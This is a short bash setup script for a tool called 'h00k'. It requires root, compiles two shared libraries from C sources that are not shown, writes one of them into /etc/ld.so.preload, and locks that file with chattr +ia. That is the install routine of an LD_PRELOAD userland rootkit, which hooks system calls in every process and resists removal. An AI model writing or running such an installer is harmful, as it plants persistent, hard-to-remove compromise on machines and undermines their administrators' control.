#!/bin/bash
clear

cat <<"EOF"
 ('-. .-.                    .-. .-')   
( OO )  /                    \  ( OO )  
,--. ,--.  .----.    .----.  ,--. ,--.  
|  | |  | /  ..  \  /  ..  \ |  .'   /  
|   .|  |.  /  \  ..  /  \  .|      /,  
|       ||  |  '  ||  |  '  ||     ' _) 
|  .-.  |'  \  /  ''  \  /  '|  .   \   
|  | |  | \  `'  /  \  `'  / |  |\   \  
`--' `--'  `---''    `---''  `--' '--' 
EOF

if [ $(id -u) != 0 ]; then
    echo ""
    echo "Please run this as root! Exiting..."
    echo ""
    exit
fi

if [ "$1" == "--help" ]; then

	echo "Usage: ./setup.sh [args]"
	echo "Only two args are --help and --no-hook"
	echo "--no-hook will only compile and not hook system calls"
	echo ""
	exit
fi

echo ""
echo "Setting up h00k..."
echo ""

cd /home/landy/Projects/misc/h00k

type="-std=gnu99"
flags="-O0 -Wall -fomit-frame-pointer -fPIC -shared -ldl -Wl,--build-id=none -o"
dir=$PWD

gcc $type h00kExec.c $flags h00kExec.so
gcc $type h00kDir.c $flags h00kDir.so

if [ "$1" != "--no-hook" ]; then
	echo $dir/h00kDir.so > /etc/ld.so.preload
	chattr +ia /etc/ld.so.preload
fi

echo "Done!"



